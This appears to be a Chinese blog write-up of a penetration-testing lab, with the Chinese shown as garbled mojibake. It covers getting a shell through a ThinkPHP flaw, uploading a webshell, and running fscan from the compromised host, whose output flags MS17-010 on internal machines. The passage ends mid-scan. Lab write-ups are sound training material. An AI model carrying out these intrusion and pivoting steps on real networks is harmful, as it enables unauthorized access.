    <url>/2025/03/30/cyberstrikelab-lab1/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€å¹²"><a href="#å¼€å¹²" class="headerlink" title="å¼€å¹²"></a>å¼€å¹²</h1><p><strong>é¢˜ç›®</strong>ï¼šæœ¬æ¬¡å°æçš„ä»»åŠ¡æ˜¯æ”»å…‹192.168.10.0&#x2F;24ç½‘æ®µçš„æ‰€æœ‰ä¸»æœºï¼Œåˆšå¼€å§‹æŒºé¡ºåˆ©ï¼Œä½†æ·±å…¥åå‘ç°é‡Œé¢çš„æƒ…å†µè¿œæ¯”æƒ³è±¡çš„å¤æ‚ã€‚</p><p>æŒ‚ä¸Šopenvpnï¼Œä¿®æ”¹ç‰¹å®šæµé‡èµ°vpn</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull <br><span class="hljs-attribute">route</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure><p>è¿›å»æ˜¯ä¸€ä¸ªCMSï¼Œæ²¡å•¥ä¿¡æ¯</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330130911534.png" alt="image-20250330130911534"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160544119.png" alt="image-20250330160544119"></p><p>æ— å½±ä¿¡æ¯æœé›†ä¸€æ³¢</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160825664.png" alt="image-20250330160825664"></p><p>EyouCMSv1.0.9</p><p>åå°ç™»å½• <code>http://192.168.10.10/index.php/admin/Admin/login</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161123484.png" alt="image-20250330161123484"></p><p>ä½†æ˜¯å•¥ä¹Ÿæ²¡æœ‰ï¼Œå¼±å£ä»¤æ²¡æœ‰</p><p>ä¸Šfscanæ‰«æ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160245446.png" alt="image-20250330160245446"></p><p>thinkphpä¸€æŠŠæœå“ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161706080.png" alt="image-20250330161706080"></p><p>ç›´æ¥getshell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161820531.png" alt="image-20250330161820531"></p><p>ä¸Šä¼ webshell</p><p>è¿é©¬flag1</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162308966.png" alt="image-20250330162308966"></p><p>è¿›å…¥å†…ç½‘æ¸—é€çŠ¶æ€ï¼ŒğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤“</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162432322.png" alt="image-20250330162432322"></p><p>æƒé™æ˜¯systemï¼Œæ˜¯win server2012</p><p>çœ‹ä¸‹ç½‘ç»œ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162556257.png" alt="image-20250330162556257"></p><p>ä¸¤ä¸ªç½‘æ®µï¼Œç›´æ¥ä¼ fscanä¸Šä¼ é¶æœº</p><p>ä¸Šä¼ <code>fscan.exe</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330165023160.png" alt="image-20250330165023160"></p><p>è¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.20.10</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:alive</span> è¯¦æƒ…<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:alive</span> è¯¦æƒ…<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:alive</span> è¯¦æƒ…<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span>, service=mysql, product=<span class="hljs-title class_">My</span>SQL, info=unauthorized, banner=H.j <span class="hljs-title class_">Host</span> <span class="hljs-string">&#x27;WIN-KOHRC1DGOL9&#x27;</span> is <span class="hljs-keyword">not</span> allowed to connect to this <span class="hljs-title class_">My</span>SQL server<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span>, service=http<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">23</span>] [<span class="hljs-variable constant_">PORT</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:open</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:service=unknown</span>, port=<span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:hostname=WIN-KOHRC1DGOL9</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:hostname=WIN-</span>7NRTJO59O7N, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:hostname=cyberweb</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:fingerprints=[]</span>, port=<span class="hljs-number">80</span>, service=http, title=æ˜“ä¼˜<span class="hljs-variable constant_">CMS</span> -  <span class="hljs-title class_">Powered</span> by <span class="hljs-title class_">Eyoucms</span>.com, url=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.20.10, status_code=200, length=25157, server_info=map[cache-control:private content-type:text/html</span>; charset=utf-<span class="hljs-number">8</span> <span class="hljs-symbol">date:</span><span class="hljs-title class_">Sun</span>, <span class="hljs-number">30</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">2025</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">expires:</span><span class="hljs-title class_">Thu</span>, <span class="hljs-number">19</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">1981</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">length:</span><span class="hljs-number">25157</span> <span class="hljs-symbol">pragma:</span>no-cache <span class="hljs-symbol">server:</span><span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">39</span> (<span class="hljs-title class_">Win64</span>) <span class="hljs-title class_">Open</span>SSL/<span class="hljs-number">1.1</span>.1b mod_fcgid/<span class="hljs-number">2.3</span>.9a mod_log_rotate/<span class="hljs-number">1.02</span> set-<span class="hljs-symbol">cookie:</span><span class="hljs-variable constant_">PHPSESSID</span>=pv61gs48nge4geq3958vosk3m2; path=<span class="hljs-regexp">/ status_code:200 title:æ˜“ä¼˜CMS -  Powered by Eyoucms.com x-powered-by:PHP/</span><span class="hljs-number">5.4</span>.<span class="hljs-number">45</span>]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:os_version=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, domain_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_domain=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_computer=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, workstation_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, server_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> çŠ¶æ€<span class="hljs-symbol">:vulnerable</span> è¯¦æƒ…<span class="hljs-symbol">:os=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2008</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">7600</span>, port=<span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:vulnerable</span> è¯¦æƒ…<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span>, os=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] ç›®æ ‡<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> çŠ¶æ€<span class="hljs-symbol">:identified</span> è¯¦æƒ…<span class="hljs-symbol">:workstation_service=CYBERWEB</span>, server_service=<span class="hljs-variable constant_">CYBERWEB</span>, os_version=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=cyberweb.cyberstrikelab.com, domain_name=cyberstrikelab.com, netbios_domain=<span class="hljs-variable constant_">CYBERSTRIKELAB</span>, netbios_computer=<span class="hljs-variable constant_">CYBERWEB</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span>] [<span class="hljs-variable constant_">VULN</span>] ç›®æ ‡<span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span> çŠ¶æ€<span class="hljs-symbol">:vulnerable</span> è¯¦æƒ…<span class="hljs-symbol">:vulnerability_name=poc1</span>, references=[<span 